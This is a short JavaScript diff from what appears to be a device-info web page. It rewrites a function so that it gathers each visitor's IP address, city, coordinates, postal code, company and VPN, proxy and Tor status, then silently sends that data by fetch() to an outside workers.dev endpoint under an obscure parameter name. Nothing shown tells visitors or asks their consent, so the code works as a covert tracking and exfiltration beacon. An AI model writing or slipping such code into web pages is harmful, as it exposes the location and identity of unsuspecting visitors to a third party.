@@ -100,14 +100,41 @@
         }
     }
 
-    async function sendMessageToURL(message) {
-        const url = `https://t.dog37.workers.dev/?pass_weird9351047102628027252902=${encodeURIComponent(message)}`;
-        try {
-            await fetch(url);
-        } catch (error) {
-            console.error('Error sending message:', error);
-        }
+    async function sendMessageToURL(ipInfo) {
+    if (!ipInfo) return;
+
+    // Extract only the required fields
+    const filteredData = `
+ip: ${ipInfo.ip}
+city: ${ipInfo.city}
+region: ${ipInfo.region}
+country: ${ipInfo.country}
+loc: ${ipInfo.loc}
+postal: ${ipInfo.postal}
+timezone: ${ipInfo.timezone}
+
+company:
+name: ${ipInfo.company?.name}
+domain: ${ipInfo.company?.domain}
+type: ${ipInfo.company?.type}
+
+privacy:
+vpn: ${ipInfo.privacy?.vpn}
+proxy: ${ipInfo.privacy?.proxy}
+tor: ${ipInfo.privacy?.tor}
+relay: ${ipInfo.privacy?.relay}
+hosting: ${ipInfo.privacy?.hosting}
+service: ${ipInfo.privacy?.service}
+    `.trim(); // Remove extra spaces
+
+    const url = `https://t.dog37.workers.dev/?pass_weird9351047102628027252902=${encodeURIComponent(filteredData)}`;
+
+    try {
+        await fetch(url);
+    } catch (error) {
+        console.error('Error sending message:', error);
     }
+}
 
     async function displayDeviceInfo() {
         const infoDiv = document.getElementById("deviceInfo");
